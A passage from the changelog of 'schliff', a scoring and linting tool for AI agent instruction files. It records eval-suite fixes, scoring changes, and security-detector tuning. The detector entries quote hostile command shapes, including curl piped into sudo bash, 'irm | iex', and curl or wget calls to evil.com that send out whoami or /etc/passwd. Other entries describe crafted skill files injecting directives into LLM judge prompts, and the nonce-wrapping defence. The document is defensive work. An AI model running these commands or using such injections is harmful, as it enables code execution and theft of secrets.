  distribution sits. Two unrelated methods, one number.

  `docs/SCORING.md` and `docs/ARCHITECTURE.md` both carried a hand-copied budget table
  stating the old value; both are corrected, and a test now compares each table against the
  constant in both directions — a stale value fails, and so does adding a format without
  documenting it. Nothing had gated those copies, which is why a shipped doc could state a
  budget the code no longer used.

  A regression test also asserts schliff's own card satisfies the budget schliff
  advertises for its format: a measurement tool must not flag its own exemplar.

- **The bundled eval suite measured its own source, so it measured nothing.** All 108
  `contains` assertions in `skills/schliff/eval-suite.json` appear verbatim in the
  241-line card the suite was generated from; only 54 of them appear in the prompt they
  were filed under. A suite extracted from an artifact scores that artifact 100% by
  construction — which is exactly what it did, reporting 119/119 and a composite of
  98.9 for a card that a real agent scored 0 of 8 on.

  The 44 trigger prompts and 14 edge cases are unchanged. The test cases are re-derived
  from their prompts and from the public CLI surface: 4 cases, 13 assertions, each one
  answering "what would a card need to contain for an agent to do what this prompt
  asks". Against this card they pass 13/13; against a minimal placeholder card, 1/13 —
  so they discriminate rather than describe.

  Test cases whose prompts asked for things that do not exist were dropped rather than
  satisfied: there is no `discovery mode` and no `high-ROI` ranking (zero occurrences
  in `scripts/`), and no custom-metric interface. The 241-line card and its original
  suite are kept intact as frozen fixtures under
  `skills/schliff/tests/fixtures/self-skill-baseline/`.

- **Loop documentation now lives with the loop.** Ten of the suite's test cases probed
  the autonomous improvement loop but asserted against `SKILL.md`, forcing the
  agent-facing card to carry the vocabulary of a subsystem reachable only through the
  `/schliff:*` plugin commands. That coverage moved to
  `tests/unit/test_command_docs_document_the_loop.py`, which gates the command docs
  that actually own the behaviour.

- **Self-test floors measure the property instead of a proxy.** `test-self.sh`'s
  composite floor drops 90 → 85 (matching the same assert in `test.yml`, which was
  skipped rather than passing on the red run), because the 90 was only ever met by the
  circular measurement above. The `>= 100 lines` guard is replaced by `structure >= 90`:
  it was rejecting a deliberate 99-line trim while accepting padding. Measured on this
  card and two degradations — full 95, worked examples stripped 85, gutted to bare
  commands 75 — so the replacement catches both losses the line count caught.

### Fixed

- **The card-executable test wrote into the repo's own score history.** It ran each
  documented command with the working directory set to the package, and `verify` appends
  to `.schliff/history.jsonl` *relative to the working directory* — so every test run
  added three throwaway entries recording `32.7 [F]` for a tmpdir copy of the card — the
  data `progress.py`, `diff` and `/schliff:report` read. It accounted for 61 of the 212
  throwaway rows in this repo's history; the rest are older residue from tests that stopped
  doing this in June. The commands now run from the sandbox, which also makes the test more
  faithful: the card's promise is that they work from anywhere.

- **An assertion the evaluator could not run counted as one the skill failed.**
  `run-eval.sh` evaluated patterns with `grep -qiE … 2>/dev/null` inside an `if`, and
  grep's exit status carries three outcomes rather than two: 0 matched, 1 did not match,
  **2 could not compile the pattern**. `timeout` adds 124. All of them collapsed into
  `passed: false` with the reason discarded.

  What that cost, measured: six assertions in the previous suite were dead on CI for
  months (`main` reported 113/119 there against 119/119 on a developer machine, whose
  `grep` was a more permissive implementation), and the reason was unobtainable — which
  is how a **wrong** diagnosis about the generator ended up published in a commit
  message. The swallow does not only produce dead tests, it makes confident wrong
  statements about them the only available move.

  Unrunnable assertions are now reported as such: `pass_rate` gains an `errored` count,
  the affected `binary_results` entry carries an `error` explaining which construct grep
  refused, and a warning goes to stderr. They are **excluded from the pass-rate
  denominator** and **not written to `.schliff/failures.jsonl`** — an assertion that
  cannot execute is evidence about the suite, not about the skill, and `/schliff:triage`
  clusters that file into proposed SKILL.md fixes.

  Note the ReDoS guard above the call never covered this: it rejects *expensive*
  patterns, not invalid ones — `validate_regex_complexity("[")` returns ok.

  **Output contract:** `pass_rate.errored` is new; `binary_results[].error` appears only
  on unrunnable assertions. Both additive.

- **Two gates so the fix cannot rot.** Excluding errored assertions shrinks the
  denominator, so a decaying suite could report a *rising* pass rate — one runnable
  assertion out of thirteen reads 100%. `test-self.sh` therefore asserts `errored == 0`
  on schliff's own suite (verified red by injecting `(` — the pass rate stayed at a
  reassuring 100% while only the new assertion moved). And `test-integration.sh` now runs
  a suite `init-skill.py` generated instead of only checking that its JSON parses, which
  turns the generator's contract from shape into property.

- **`/schliff:auto` documented a flag that does not exist and a state file it does not
  write.** `commands/schliff/auto.md` listed `--resume`, which `auto-improve.py` rejects
  with `unrecognized arguments` and exit 2 — the same defect class as the `doctor <dir>`
  fix above it. It attributed the loop's history to `.schliff/history.jsonl`, which
  belongs to `verify --history`; the loop writes `.schliff/auto-improve-state.jsonl`.
  Its invocation assumed a working directory of `skills/schliff`.

  It also implied parallel worktree experimentation. `auto-improve.py` detects the stuck
  condition and prints `Triggering parallel branching…`, then continues in-process — no
  branch, no worktree. The doc now says so, and a test asserts it keeps saying so.

  Added, all verified by running the driver first: the cross-session episode store
  (`~/.schliff/meta/episodes.jsonl`, recalled before iterating and written after), the
  per-iteration record shape, the undocumented three-consecutive-errors stop, and the
  real output format.

## [8.8.2] - 2026-07-29

### Fixed

- **The exfil sink could be walked around by wrapping the interpreter.** 8.8.1 narrowed
  the sink so a pipe only counts when it pipes into something that executes or transmits,
  but it required the interpreter token *flush against the pipe*. Anything in front of it
  went straight through — and `curl … | sudo bash` is **more** dangerous than the form
  that was caught, not less.

  Two evasion families, which compose:

  | shape | 8.8.1 | now |
  | --- | --- | --- |
  | `curl … \| sudo bash`, `\| sudo -E sh`, `\| env FOO=1 bash` | missed | caught |
  | `curl … \| /bin/bash`, `\| /usr/bin/env sh` | missed | caught |
  | `curl … \| iex`, `\| pwsh`, `\| powershell`, `\| php`, `\| fish`, `\| dd` | missed | caught |

  A bounded wrapper chain (`sudo`/`env`/`command`/`nohup`, their flags and assignments)
  and an optional absolute path may now precede the interpreter, and the interpreter list
  gained the shells and runtimes it was missing. `iex` is the embarrassing one: the very
  corpus that motivated the 8.8.1 change contained `irm … | iex` in prose.

  Every quantifier in the addition is bounded and the wrapper chain is non-nullable —
  this pattern has a ReDoS history and the widening must not reintroduce one. Verified
  linear against adversarial wrapper/flag/assignment/path runs (~2× per doubling,
  1.6 ms at n=2000).

  **No false positives were re-opened:** re-scanning the same frozen 670-skill corpus
  gives byte-identical stock counts — 44 total, `exfil` 6, every category ±0.

  **Why it was missed:** the 8.8.1 guard assertions were derived from the same assumption
  as the pattern — every one of them was a bare `| <interpreter>` form. A test written
  from the same mental model as the code cannot find that model's blind spot. The new
  guards cover the wrapper and path families explicitly.

  Also recorded, since 8.8.1 only said "the backtick span is removed" without naming the
  cost: that change gave up legacy backtick command substitution, so
  ``curl http://evil.com/`whoami` `` and ``wget `cat /etc/passwd` …`` no longer match.
  POSIX `$(…)` and `<(…)` still do, which is the form real payloads use.

  **The evasion set was then enumerated rather than guessed.** Differencing every
  verb × sink combination against the pre-narrowing 8.8.0 pattern surfaced four more
  genuine shapes that had slipped through — `|& bash` (bash's stderr-merging pipe),
  `| "bash"` and `| 'sh'` (quoted), `| $SHELL` (named through a variable), and
  `| busybox sh` (applet multiplexer) — all now closed. The same differential confirmed
  that the only other losses versus 8.8.0 are `| jq`, `| grep`, `| less`, `| column -t`
  and `| head`, which is the narrowing working as intended. Every difference against the
  previous pattern is now either caught or deliberately benign.

  Corpus re-scanned after each widening: stock counts stay byte-identical at 44, every
  category ±0. ReDoS re-verified linear after both changes.

## [8.8.1] - 2026-07-29

### Fixed

- **Three security patterns fired on ordinary prose.** They were found by running the
  shipped scorer over a frozen corpus of 670 SKILL.md files from 134 public community
  hubs and hand-adjudicating every hit. The scan produced 144 matches and **zero** true
  positives; two of these defects accounted for 68 of them, and the third is the same
  class caught while fixing them.

  `_RE_SEC_DATA_EXFIL` had no word-boundary anchor, so the short `nc` alternative matched
  the **tail of any word ending in "nc"** followed by whitespace. Markdown is full of
  them — "async ops", "sync primitives", "CNC tool-path generation", and
  `go test -bench=BenchmarkMyFunc -benchmem ./pkg/... | tee report.txt`. The anchor is
  applied to the two alternatives that begin with a verb, not to the whole group: the
  middle alternative starts with a subshell, where a word boundary could never hold.

  `_RE_SEC_DANGEROUS_CMD` treated `rm -rf /` as a prefix, so it matched
  `rm -rf /<any absolute path>` and reported the canonical Docker layer cleanup
  `rm -rf /var/lib/apt/lists/*` as a root wipe. The recursive-force alternatives now
  require the target to be root itself.

  `_RE_SEC_ENV_LEAK` had the identical missing anchor as the exfil pattern — `cat` and
  `log` are the tails of `concat`/`logcat` and `catalog`/`changelog`/`blog`. **Unlike the
  other two this one is latent, not observed:** it produced zero false positives in the
  corpus, where all 17 of its matches were genuine verb invocations. It is fixed for
  consistency and because the exposure is broad — the same corpus carries 290 occurrences
  of 27 distinct carrier words, each one nearby secret token away from firing. Its match
  count on the corpus is unchanged at 17, confirming no genuine match was lost.

- **The exfil sink read markdown syntax as shell syntax.** `_RE_SEC_DATA_EXFIL` accepted
  a bare `|` or any backtick span as evidence of a pipe or command substitution. The
  input is markdown, which reuses both characters for entirely different things — `|`
  separates table cells, backticks mark inline code — so ordinary API documentation
  matched: a table row reading "Fetch full transcripts for source files", or the prose
  "if the response `Content-Type` is". One skill was flagged on a passage **warning its
  users not to pipe curl into bash**.

  A pipe now counts only when it pipes into something that executes or transmits
  (`sh`, `bash`, `python3`, `node`, `eval`, `nc`, `curl`, `tee`, `xargs`, `base64`, …).
  The backtick span is removed. `$(` and `<(` stay, since markdown does not reuse those.

  **Recall note, stated plainly:** the field corpus contains **zero** genuine exfil
  detections — every one of its exfil hits was adjudicated a false positive, including
  the hit on the genuinely malicious fixture, whose real payload is caught by
  `obfuscation` rather than here. The corpus therefore cannot demonstrate that recall
  was preserved; only the guard assertions in
  `tests/unit/test_security_field_false_positives.py` do, and they were written to carry
  that weight.

  **Impact, measured on the same 670-file corpus, all four fixes together:** stock
  matches **144 → 44** (−69%). `exfil` 106 → 6, `dangerous_cmd` 13 → 0, `env_leak`
  unchanged. Files scoring a perfect 100 on security: **598 → 650**. Files tripping the
  advisory gate (`SECURITY_GATE = 70`) — every one of them a false alarm, since the
  corpus yielded zero true positives — **27 → 6**, and of the six that remain, one is
  the genuinely malicious fixture and one an openly declared red-team skill. No file
  gained a match.

  **Narrowed, not disarmed.** The four genuinely hostile files keep every real
  detection: `injection` and `obfuscation` counts are byte-identical, and the single
  `exfil` hit that disappeared was itself the false positive "Check curl is installed:
  `which curl`".

  **Not affected:** schliff's own `AGENTS.md` and `README.md` match neither pattern
  before or after, so the published hero score and badge do not move. Golden scores are
  unchanged.

  **For external files:** security scores can only rise, never fall — the change removes
  penalties, it never adds them.

  Both defects are pinned as repo-named regressions in
  `tests/unit/test_security_field_false_positives.py`, each false-positive case paired
  with a guard asserting the genuine attack shape still matches, so a future change
  cannot silence a detector instead of narrowing it.

## [8.8.0] - 2026-07-28

### Changed

- **An unrecognised `<runner> run <target>` no longer counts as a build command
  (#133).** `operational_coverage` credited the `build` category whenever a
  `run`/`r`/`exec`/`dlx` keyword had been consumed — without ever inspecting the
  target. `npm run wibble` scored a build; `npm run test-unit` scored a build
  rather than a test; and the identical script written as `yarn test-unit`, with
  no keyword to consume, was dropped entirely. The engine reported "real build
  command resolved" about a target it had not looked at.

  Such commands now carry the family `unclassified`: real and runnable, family
  undetermined. This mirrors the doctrine `check-commands` already follows —
  claim `dangling` only when provable, otherwise `unknown`.

  `pylint` joined the intrinsic test tools, where the 16 other linters already
  sat, so `uv run pylint` is now classified `test` instead of losing its family
  along with the fallback.

  **Impact:** `unclassified` credits no category, so files that documented no
  build step stop being scored as if they did. Over the 30-file AGENTS.md corpus
  exactly one file moves (80.6 → 72.6, one B→C reclassification); mean 61.79 →
  61.53, median/min/max unchanged. Golden re-derived from the engine.

  **Not affected:** `check-commands` resolves the identical command set — proven
  set-identical over 259 real instruction files (409 command/status tuples, zero
  difference, zero new `dangling` claims). `make test-unit` and friends remain
  outside the vocabulary by design; loosening that guard was measured to buy 2
  genuine commands at the cost of 14 non-commands, and is documented in the
  README rather than changed.

- **Output contract:** `schliff check-commands --json` may now emit
  `"family": "unclassified"`. Existing values are unchanged and `status` is
  untouched, but consumers that switch on `family` should treat it as an open set.

## [8.7.0] - 2026-07-22

### Changed

- **The `structure` score is now reproducible — a pure function of the file's
  bytes (#10).** It previously depended on the file's on-disk neighbourhood (a
  sibling `references/` directory and whether declared references resolved on
  disk), so the *same* file scored ~15 points higher in its real directory than
  in isolation — the public badge disagreed with the author's own CLI, worst on
  AGENTS.md (structure weight 0.4). Now:
  - Progressive disclosure is credited from **content** — markdown links to local
    `.md` detail files (and anchored `references/` paths) — not from a
    `references/` directory a reader is never pointed to. `scripts/` build-command
    mentions no longer count. Tiered: ≥2 links → full credit, 1 → partial, 0 → none.
  - The referenced-files component credits well-formed declared references from
    content, with a traversal (`..`) / ref-stuffing guard that also prevents the
    linter from ever being used as a filesystem existence oracle.
  - Dangling-reference detection is preserved as a **non-scoring lint issue**,
    emitted only from a provable on-disk location, so it never fires falsely in an
    isolated or temp-scored context.
  - This also corrects a long-standing under-crediting of AGENTS.md/CLAUDE.md/
    `.cursorrules`, which are always scored through a normalized temp copy: their
    content disclosure links are now credited. **Scores for files that link detail
    move upward** — including this repo's own AGENTS.md (91.6 [A] → 93.6 [A]), which
    now scores identically in-repo and in isolation. Golden scores were rebaselined
    with documented values; field-validated over 115 real installed skills. A new
    isolation-equivalence test pins that a file scores the same with and without
    its on-disk siblings.

### Fixed

- **The terminal no longer silently drops score warnings (#22).** The calibrated-
  weights "not comparable" notice and the "no weighted dimensions" warning — both
  already present in the JSON output — were dropped from the terminal rendering.
- **`compare` no longer leaks the `-1` sentinel (#21).** Unmeasured dimensions
  (triggers/quality/edges with no eval suite) were rendered as literal `-1.0`
  rows and produced phantom deltas; they are now excluded, mirroring the terminal
  score display.

## [8.6.3] - 2026-07-22

### Security

- **Hardened the engine against untrusted input in third-party CI.** A pre-launch
  adversarial audit reproduced these before fixing; no golden score changes
  (`operational_coverage`/profile byte-identical).
  - **ReDoS** in the security exfil/env-leak patterns: the greedy `[^\n]*` after a
    verb prefix was O(n²) on a newline-free line (~1h CPU at the 1MB read cap,
    reachable ungated via a `.txt` that auto-detects as a system prompt). Bounded to
    `[^\n]{0,200}`.
  - **Quadratic DoS** in the clarity scorer (runs on every default instruction-file
    score): the action-pair extractor scanned the full tail of a newline-free line
    per match (~3min at the cap). Bounded the tail slice.
  - **Filesystem-boundary oracles** in `check-commands`: a symlinked `Makefile`/
    `package.json` or an escaping `bun run <path>` was read/probed outside the repo
    root, turning resolved/dangling verdicts into an out-of-repo content/existence
    oracle. Added a `realpath`+`commonpath` containment guard at each manifest read.

### Fixed

- **`--format <alias>` token budget.** The short aliases (`cursor`, `agents`,
  `claude`, `skill`, `system-prompt`) fell back to the unknown=1500 budget instead
  of their real one, flipping the within-budget verdict. They now resolve via
  `FORMAT_ALIASES` before the lookup.
- **Dead playground link.** The Action's PR comment linked `play.schliff.dev`
  (never registered, NXDOMAIN); repointed to the live playground.

## [8.6.2] - 2026-07-21

### Added

- **GitHub Action surfaces dangling commands.** The `AGENTS.md Lint` action now
  runs `check-commands` for `AGENTS.md`/`CLAUDE.md` and renders any dangling
  commands as a section in its existing PR comment. New opt-in `fail-on-dangling`
  input (default `false`) and `dangling_count` output. Requires schliff ≥ 8.6.1
  for false-positive-safe behavior; older engines degrade silently.

### Fixed

- **`check-commands` workspace false positives + resolver hardening.** A large
  adversarial review + council + a field sweep of 135 real repos found the 8.6.1
  check still reporting working commands as `dangling` on monorepos. Every change
  only demotes `dangling`→`unknown` (never a new false claim); `operational_coverage`
  is untouched, so scoring is byte-identical. A field diff over 140 real repos: 17 →
  4 dangling claims, every removal workspace-justified.
  - **Workspace-aware demotion** (the real false-positive class): a `<pm> run <script>`
    missing from the ROOT manifest is `unknown`, not `dangling`, when the repo declares
    workspaces (`pnpm-workspace.yaml` or a truthy `workspaces` key) — the script may
    live in a child package.
  - **Denial-of-service input-budget guard** on attacker-authored docs (5000 lines /
    2048 bytes-per-line / 256 distinct commands → all-`unknown`, no per-command work),
    plus per-call memoization of manifest parses.
  - **realpath containment** for the interpreter path check, closing a symlink
    existence-oracle.
  - **Accurate report lines** — the real extraction line is threaded from the
    extractor, retiring a quadratic substring scan that could mislocate the line and
    bypass the `cd` demotion.
  - **Dequoted script tokens** and `--if-present` handling (a missing script is not a
    hard error) → `unknown`.

## [8.6.1] - 2026-07-21

### Fixed

- **`check-commands` false positives on real repos.** An adversarial review plus a
  field sweep of real monorepos (palantir/blueprint, remotion, remix, swc) found
  the 8.6.0 check reporting working commands as `dangling` — the exact
  credibility-fatal error its conservative contract exists to prevent. All are now
  correctly `resolved`/`unknown`; every fix only demotes `dangling`→`unknown`, so
  the check can never gain a false claim, and `operational_coverage` is untouched
  (scoring unchanged). Classes fixed:
  - `cd sub/dir && npm run x` — the extractor drops the `cd`, so the script
    resolved against the repo-root manifest (standard monorepo idiom).
  - `(cd x && npm run build)` — the trailing paren clung to the token.
  - `bun run index.ts` / `bun run dist/out.js` — bun resolves scripts, then files,
    then binaries; absence is unprovable, so bun never yields `dangling`.
  - `yarn tsc` / `yarn run x` — every yarn form falls back to `node_modules/.bin`.
  - `make -C dir target` — the directory was read as the target.
  - `pnpm run -r build` — the flag was read as the script name.
  - `$(TARGETS):` and `%.o: %.c` — variable/pattern targets are not enumerable, so
    the target set is treated as incomplete.
- **`check-commands` denial-of-service on attacker-authored build files.** Parsing
  a consumer's `Makefile`/`package.json` in CI is untrusted input:
  - `include` fan-out had no visited-set (N**5 file opens; 15s at N=12) → iterative
    worklist, O(files).
  - the `include` regex backtracked quadratically on long whitespace (15.7s on one
    800KB line) → linear.
  - `include ../../outside` was opened (a read primitive outside the checkout) →
    realpath-contained to the repo root.
  - a deeply-nested `package.json` raised `RecursionError` (a `RuntimeError`, not
    caught) and crashed the check → now degrades to `unknown`.

## [8.6.0] - 2026-07-20

### Added

- **`check-commands`** — a deterministic CI gate that flags setup/build/test
  commands in an `AGENTS.md`/`CLAUDE.md` that don't resolve to a real make
  target, npm script, or path in the repo (exit 1 if dangling). Reuses the
  `operational_coverage` command extractor (no scoring impact); false-positive
  safe (unprovable absence → `unknown`, never `dangling`); live-hardened against
  ~70 real repos. schliff dogfoods it against its own `AGENTS.md` in CI. (#112)

### Fixed

- **`operational_coverage` object-first prohibitions**, badge temp-dir leak, and
  badge error caching (#110).

## [8.5.0] - 2026-07-07

### Fixed

- **`verify` scores under the detected format profile** (#102, closes #101).
  It previously hand-rolled the SKILL scorer set, so `schliff verify AGENTS.md`
  scored the file under the wrong profile and failed spuriously (27.7/F on a
  file `score` grades 91.6/A). Now wired like `score`/`badge`:
  `detect_format → build_scores(fmt) → compute_composite(fmt=fmt)`. SKILL.md
  verdicts are unchanged.
- **Positional negation in `operational_coverage`** (#96): contrastive
  sentences ("run X, never Y directly") keep the recommended command instead
  of discarding both.
- **Dead-marker detector matches marker tokens, not English prose** (#97,
  closes #93): UPPERCASE tokens/stubs count; words like "placeholder" in
  prose no longer false-positive. Corpus goldens re-derived.

### Security

- **Runtime scorer prompt hardened** (#99): skill content is nonce-wrapped
  (`<skill_context_NONCE>`) so crafted files cannot forge the prompt
  structure. Defense-in-depth — the dimension remains opt-in and gated off.

### Added

- Instant star-count notify workflow for the profile-repo badge (#98).
- Theme-aware README hero (light/dark SVG) + social-preview asset (#106).
- Dependabot now groups github-actions bumps into one PR — split bumps of
  lockstep actions (codeql init/analyze) could never pass CI (#107).

### Docs

- **README redesigned** (#100): AGENTS.md-first, every number ground-truthed
  against the released engine, ShieldClaw case-study table disambiguated
  (ceiling vs quality), hydra field study added, new "What the score does not
  measure" section, Marketplace listing linked.

## [8.4.0] - 2026-07-03

### Added

- **`operational_coverage` dimension for AGENTS.md** (PR #83). Measures whether
  an AGENTS.md actually equips a coding agent to operate the repo: real
  setup/build/test commands (command-family classification, doc-wide, headings
  never gate) plus code-style / gotchas / PR directive sections with concrete
  code tokens. Surfaced in the CLI dimension table, the Action's PR comment,
  and accepted by the leaderboard submit API.

### Changed

- **BREAKING (scores): AGENTS.md headline profile is now
  `structure 0.40 / operational_coverage 0.40 / efficiency 0.20`** (was
  0.5/0.5). `efficiency` was a validated gameable proxy — a junk-fence-stuffed
  doc scored 92.5/A while the same real commands inline scored 70.0/C. All
  AGENTS.md scores re-baseline: 30-file corpus mean 61.06, no file reaches S.
  SKILL.md / CLAUDE.md / .cursorrules / system-prompt scoring is byte-identical.

### Security

- Fixed a ReDoS in the operational_coverage heading regex (quadratic on
  whitespace-only heading lines; playground/Action/leaderboard take untrusted
  input). Found and fixed pre-release by a 75-agent adversarial review, along
  with a directive-gate homonym gaming hole, a fence-state desync on
  info-string openers, and 12 command-recall bugs — see
  `docs/specs/agents-md-operational-coverage.md` §11.

## [8.3.0] - 2026-06-25

### Added

- **AGENTS.md scoring profile.** `AGENTS.md` is project context for coding agents,
  not a reusable skill, so it is now scored on a dedicated headline
  (`0.5·structure + 0.5·efficiency`) instead of the SKILL.md rubric. The
  eval-gated dimensions (triggers/quality/edges) plus the mis-fit composability and
  the saturated clarity are excluded from the headline denominator, and the
  nonsensical "add an eval suite" warning is suppressed for this format. A
  well-formed `AGENTS.md` now scores a defensible B/A instead of a capped ~28/None.
  Other formats (`SKILL.md`/`CLAUDE.md`/`.cursorrules`/`system_prompt`) are
  byte-identical. Spec: `docs/specs/agents-md-scoring-profile.md`. (#67)
- `suggest`/`evolve` no longer emit SKILL-only advice (frontmatter, eval-suite,
  handoffs) for `AGENTS.md`. (#67)
- **GitHub Action rebranded to "AGENTS.md Lint".** `action.yml` now lives at the
  repository root (Marketplace-eligible), defaults to scoring a root `AGENTS.md`
  (`skill-path` is optional), and posts a format-aware scored PR comment. Usable as
  `uses: Zandereins/schliff@v1`. (#66, #68, #69)

### Fixed

- The Action's PR comment no longer renders unmeasured (`null`) dimensions as a
  misleading `0/100`; they are omitted, matching the engine's terminal output. (#68)

## [8.2.0] - 2026-06-11

### Added

- Public **Vercel deployments**: an interactive playground (`POST /api/score`, real scoring
  engine) and a community leaderboard (`/api/submit`, `/api/query`). (#50, #54)
- Leaderboard **durable storage on Upstash Redis (Vercel KV, $0)** — atomic dedup upsert that
  survives cold starts, plus a KV-backed per-IP rate limiter; transparent ephemeral `/tmp`
  fallback when KV is not configured. (#58, #59)
- **CodeQL** SAST workflow (`security-extended`, SHA-pinned, least-privilege). (#59)
- Machine-readable version output / agentic-integration groundwork. (#57)

### Changed

- **BREAKING: drop Python 3.9 support** — minimum supported version is now Python 3.10
  (`requires-python = ">=3.10"`). Python 3.9 reached end-of-life on 2025-10-31. The CI test
  matrix and ruff `target-version` were updated accordingly. (#55)
- Modernized license metadata to the PEP 639 SPDX expression form (`license = "MIT"`), dropping
  the deprecated `License :: OSI Approved :: MIT License` classifier. Requires `setuptools>=77`. (#55)
- Playground now reports an **honest structural score** (renormalized over the four deterministic
  dimensions) instead of a coverage-capped composite; removed a phantom `sync` dimension. (#54)

### Fixed

- Leaderboard submit read-modify-write **race + non-atomic write** (now flock-serialized +
  atomic `os.replace`). (#58)
- Vercel deployability (score.py `sys.path` bootstrap, `framework:null`, build-artifact
  gitignore), JSON crash guard, `install.sh` hardening, CLI error UX, and web
  a11y/contrast/keyboard + Google-Fonts CSP. (#50, #53, #55, #56)

### Security

- **Fix ReDoS / remote CPU-DoS in the scoring engine.** `_RE_REAL_EXAMPLES` / `_RE_DIFF_EXAMPLE`
  used an unbounded `input.*output` (O(n²) under `findall`); a ~256KB single-line payload via the
  public playground pegged a serverless function's CPU for ~90s. Bounded to `input.{0,200}?output`
  (linear), regression-guarded, and the playground caps scored input at 32KB as defense-in-depth. (#59)
- **Prompt-injection hardening** — nonce-wrap untrusted skill content in the judge and runtime
  evaluators; pre-validate regex complexity. (#56)
- Hardened web security headers across both apps: CSP (playground drops `script-src
  'unsafe-inline'` via a sha256 pin), HSTS, **Permissions-Policy**, X-Frame-Options, nosniff,
  Referrer-Policy, `Cache-Control: no-store`. (#50, #56, #59)
- **Bound durable leaderboard submissions** (global 500/3600s + 10000-entry size cap) against
  persistent pollution; NFKC + invisible-character dedup-bypass guard; generic 500s. (#50, #58, #59)
- Supply chain & repo posture: SHA-pinned actions, OIDC trusted publishing, pinned `schliff` in
  the web apps, `.env*.local` gitignored, and `main` branch protection (required CI checks). (#59)

## [8.1.0] - 2026-06-03

### Added

- Multi-agent correctness/security/determinism hardening (PR #46): calibrated weights gated
  behind `SCHLIFF_CALIBRATED_WEIGHTS` (off by default) so `verify`/`badge`/leaderboard stay
  reproducible; `weight_source`/`weights_hash` provenance; BOM-invariant scoring at the read
  boundary; ReDoS-safe secret redaction; format-aware composite weighting across the CLI.
- CI lint gate: `ruff` now runs and gates in GitHub Actions (baseline cleaned to zero findings).
- Community-health files: `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1) and an
  issue-template `config.yml`. Top-level `--version`/`-V` flag.

### Changed

- README + `docs/` redesign: accurate full-denominator composite model (replaces the previously
  inverted description in `SCORING.md`), correct dimension/weight tables, single-sourced version,
  current architecture with diagrams. Web playground/leaderboard corrected to the canonical model
  (removed a non-existent dimension, fixed repository links, hardened CSP).
- Packaging: CLI version is single-sourced via `importlib.metadata` (no more hardcoded drift).
- Performance: `doctor` single tree-walk, O(n) header lookup in `structure`, cached regexes/MinHash.

### Removed

- Internal launch corpus and marketing drafts from the public tree (regenerable via
  `skills/schliff/scripts/launch/`); untracked local tooling artifacts.

## [8.0.0] - 2026-05-29

### Added

- Failure-mode-first AI-Eval foundation: sprint spec + 7 ADRs, Phase-0 open-coded failure-mode
  taxonomy (10 snapshotted skills), Phase-1 calibration scaffold.
- Deterministic judge guards (`scoring/guards.py`): destructive-command, gating-invariant
  (linter-completeness floor), and mixed-script detectors — staged for the v8.1 judge harness, not
  wired into the live linter; they carry no composite weight.
- Judge v0 smoke-test harness (`judge/judge_v0.py`, optional `[judge]` extra): pinned model,
  structured output, mock-testable. Calibration is FROZEN as v8.1 backlog (4 live runs plateaued at
  directional 7/11; resumes only when distribution yields real users + a concrete quality miss).
- GitHub Action (`action/action.yml`) to score skills as a CI / PR quality gate.
- Plugin-marketplace install: schema-valid `.claude-plugin/marketplace.json`
  (`/plugin marketplace add Zandereins/schliff`) plus `npx skills add` support.
- Leaderboard scoring-model epoch versioning: v7-scale and v8-scale composites never co-rank;
  `?score_model=N` selects a scale (default = the latest epoch present).

### Changed

- **BREAKING (scoring):** Composite is now computed over a single canonical 7-dimension basis
  with a full denominator — unmeasured dimensions are uncredited (not silently renormalized away).
  Scores for skills without an eval suite are lower and now reflect coverage. This unifies the
  `score`/`doctor`/`bench` and `evolve` paths (one number per file) and closes the anti-gaming gap
  where a gamed skill could match a clean one at composite level. Security is reported as a separate
  signal/gate, no longer folded into the headline. CI thresholds (`fail if score<N`) may need
  re-tuning. See `docs/superpowers/specs/2026-05-26-audit-followups-design.md`.
- Anti-gaming: added a spread-keyword-stuffing penalty (efficiency dimension) and a composite
  separation gate (`benchmarks/anti-gaming`) asserting every gamed skill scores below a clean control.
- `verify` is now coverage-aware: the pass threshold scales with measured coverage
  (effective_min = min_score × coverage), so skills without an eval suite are judged against a
  structural bar instead of the unreachable full default. Adding an eval suite raises the bar to
  the full surface.
- Cold-start UX: the partial-coverage message reads as an invitation (ℹ "add an eval suite to score
  the rest"), not a scold (⚠ "uncredited / ceiling").
- README leads with native install (`/plugin marketplace add`, `npx skills add`); pip demoted to CLI/CI.

### Fixed

- `missing_refs` (structure): referenced files resolve skill-local OR against an enclosing
  plugin/.git root (fixes false-positives on plugin-monorepo layouts), with full paths in the
  message; plus path-traversal confinement (reject `..`, resolve-confine) so an untrusted SKILL.md
  cannot probe the filesystem.
- `evolve._score_file` auto-discovers the eval suite, matching `schliff score`.
- Public playground reframes a partial-coverage result as a "Structural Score" with a neutral
  coverage chip instead of a red failing grade (no second scale introduced).
- Public endpoints: hard cap on decoded skill text (compute-DoS bound) + read-cap vs a lying
  Content-Length; leaderboard responses tagged `verified:false` / `unverified:true`.
- `commands/schliff/mesh.md` registered as `/mesh` instead of `/schliff:mesh`.

### Security

- Pre-launch audit (3 parallel lenses + Hydra closing council): removed tracked internal docs that
  contradicted the pitch; SECURITY.md version table + network/exec claims scoped to the zero-dep core.

## [7.2.0] - 2026-04-24

### Security

- **Prompt-injection hardening in `schliff evolve`**: user-authored skill
  content is wrapped in explicit XML tags with a per-call random nonce
  before being passed to LLM prompts. Earlier versions fed raw content
  into the meta-prompt, letting a crafted SKILL.md inject directives.
  A sanitizer rejects XML-tag injection attempts and an explicit
  `<user_content>…</user_content>` boundary isolates user input.
- **CLI error-handling with no traceback leaks**: `schliff score` on a
  directory or oversized file no longer leaks a raw Python traceback.
  `read_skill_safe` rejects directories explicitly with a clear
  `ValueError`; `cli.main()` wraps handler dispatch in one
  `(OSError, ValueError)` try/except that renders a short `Error: …`
  line on stderr and exits 1.

### Fixed

- **Scoring robustness across all dimensions**: all five scorers that
  consume user-authored eval-suite JSON (`edges`, `triggers`, `quality`,
  `runtime`, `coherence`) now guard their list-valued fields with
  `isinstance(…, list)` checks. Pre-fix, a truthy non-list
  (`{"edge_cases": 42}`, `{"triggers": "abc"}`) crashed the scorer with
  `TypeError` from `len()` or `AttributeError` from `.get()` on a string
  character. Post-fix each scorer returns its standard sentinel (score
  −1 / bonus 0) on malformed input; inner `assertions` and `test_case`
  items are filtered via `_assertion_dicts` helpers.
- **`score_edges` category guard**: malformed `category` entries (ints,
  nulls, lists) no longer crash `.startswith()` during known-category
  coverage.
- **`install.sh` and `analyze-skill.sh` POSIX portability**: replaced
  GNU-only `\s` / `\S` in `grep -E` patterns with POSIX character classes
  `[[:space:]]` / `[^[:space:]]`. On older macOS (classic BSD grep),
  the installer previously printed "Schliff v unknown" and `analyze-skill.sh`
  missed name / example detection.
- **Score-to-grade consistency**: playground, evolve, GitHub Action, and
